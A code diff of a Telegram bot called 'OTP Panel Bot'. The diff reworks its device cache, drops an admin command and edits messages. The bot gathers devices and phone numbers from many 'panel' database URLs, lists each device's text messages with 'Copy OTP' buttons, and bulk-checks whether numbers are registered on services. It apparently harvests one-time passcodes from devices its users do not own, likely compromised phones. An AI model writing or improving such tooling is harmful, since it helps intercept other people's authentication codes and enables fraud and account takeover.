@@ -2,7 +2,7 @@
 """
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — ULTIMATE ENTERPRISE EDITION           
-  Railway Cloud Optimized (Anti-OOM, Shadow Caching)
+  Railway Cloud Optimized (Anti-OOM, Incremental Live Cache)
   Dynamic VIP Referrals (20->30->40) + Search Lock
   Wishlist System + Live Auto-Check Cancel + No Spam
 ══════════════════════════════════════════════════════
@@ -467,7 +467,7 @@ async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web
     except Exception: pass
 
 # ═══════════════════════════════════════════════════════
-#  SHADOW CACHING FETCHERS 
+#  🔥 LIVE INCREMENTAL CACHE (NO LIST DROPPING)
 # ═══════════════════════════════════════════════════════
 
 async def fetch_db_data_task(tag: str, url: str, results_list: list):
@@ -525,35 +525,39 @@ async def _update_global_cache():
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
     
-    shadow_cache = []
+    # Preserve existing cache to prevent list size from dropping to 0
+    existing_devices = {d.id: d for d in GLOBAL_DEVICE_CACHE.get("ALL", [])}
     
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
-        tasks = [fetch_db_data_task(tag, url, shadow_cache) for tag, url in chunk]
+        results_list = []
+        tasks = [fetch_db_data_task(tag, url, results_list) for tag, url in chunk]
         await asyncio.gather(*tasks)
+        
+        # Merge new devices into the live pool immediately
+        for d in results_list:
+            existing_devices[d.id] = d
+            
+        unique_devices = []
+        seen_numbers = set()
+        
+        # Filter and Push to Global Cache immediately so user sees the list growing
+        for d in existing_devices.values():
+            if d.numbers:
+                new_nums = [num for num in d.numbers if num not in seen_numbers]
+                if not new_nums: continue 
+                d.numbers = new_nums
+                seen_numbers.update(new_nums)
+            unique_devices.append(d)
+
+        unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+        GLOBAL_DEVICE_CACHE["ALL"] = unique_devices[:4000] # Safe cap for Railway
+        
+        del results_list
+        gc.collect()
         await asyncio.sleep(0.5) 
         
-    unique_devices = []
-    seen_ids_cache = set()
-    seen_numbers = set()
-
-    for d in shadow_cache:
-        if d.id in seen_ids_cache: continue
-        seen_ids_cache.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums: continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    
-    GLOBAL_DEVICE_CACHE["ALL"] = unique_devices[:4000] # Safe cap for Railway
     scan_progress["is_scanning"] = False
-    
-    del shadow_cache
-    gc.collect()
 
 async def global_cache_loop():
     while True:
@@ -594,18 +598,6 @@ async def get_device_sms(device: Device, limit: int = 15) -> list[dict]:
 # ═══════════════════════════════════════════════════════
 #  TELEGRAM COMMAND HANDLERS
 # ═══════════════════════════════════════════════════════
-
-async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id  = update.effective_chat.id
-    if chat_id in ADMIN_IDS:
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
-            [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
-            [InlineKeyboardButton("Close", callback_data="close_msg")]
-        ])
-        await update.message.reply_text("SUPER ADMIN MENU\nChoose an advanced option:", reply_markup=kb)
-    else:
-        await update.message.reply_text("❌ You are not authorized.")
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
@@ -685,14 +677,12 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             except: pass
             return
 
-        # LIVE SCAN CANCELLATION
         if data == "cancel_scan":
             if chat_id in pending_action and pending_action[chat_id].get("action") == "auto_check":
                 pending_action[chat_id]["status"] = "stopped"
             await safe_edit(query, "🛑 **Scan Stopping...** Please wait.", parse_mode="Markdown")
             return
 
-        # WISHLIST LOGIC
         if data.startswith("wish_add:"):
             dev_id = data.split(":")[1]
             wl = users_db.setdefault(chat_id, {}).setdefault("wishlist", [])
@@ -719,7 +709,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, query.message.text, reply_markup=kb)
             return
 
-        # NAV & DISPLAY
         if data == "home":
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(chat_id)
@@ -794,9 +783,8 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             for sms in smss:
                 block, otp = format_sms_block_markdown(sms)
                 body_parts.append(block)
-                if otp:
-                    otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
-            
+                if otp: otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+                
             full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n").join(body_parts)
             if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
             
@@ -804,7 +792,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="Markdown")
             return
 
-        # AUTO-CHECKER MENUS & LOGIC
+        # AUTO-CHECKER MENUS
         if data == "open_checker_menu":
             await safe_edit(query, "<b>Select Checker (Manual Bulk)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
             return
@@ -896,7 +884,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await safe_edit(query, f"<b>✅ ALL REGISTERED</b>\n\nScanned {len(check_pool)} fresh active numbers. ALL are registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
             return
 
-        # CUSTOM PANELS / ADMIN / SEARCH
+        # CUSTOM PANELS & ADMIN
         if data.startswith("del_panel:"):
             idx_to_del = int(data.split(":")[1])
             dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
@@ -926,8 +914,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     msg_text += f"User: {uid}\n"
                     for db in dbs: msg_text += f"{db}\n"
                     msg_text += "\n"
-            if msg_text == "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n":
-                msg_text += "Koi custom panel nahi mila."
+            if msg_text == "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n": msg_text += "Koi custom panel nahi mila."
             if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
             await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
             return
@@ -963,7 +950,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
         devices = await get_all_devices(chat_id)
         if not devices:
-            await update.message.reply_text("⏳ **Live Booting...**\nThodi der baad try karein, panels fetch ho rahe hain.")
+            await update.message.reply_text("⏳ **Live Booting...**\nList is empty right now. Thodi der baad try karein.")
             return
         await update.message.reply_text(device_list_header(devices, 0, "🌐 GLOBAL DEVICES"), reply_markup=device_list_keyboard(devices, 0))
         return
@@ -1125,8 +1112,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await asyncio.sleep(0.5)
             
             res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
-            if len(res_text) > 4000:
-                res_text = res_text[:4000] + "\n...[Truncated]"
+            if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
                 
             kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
             await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
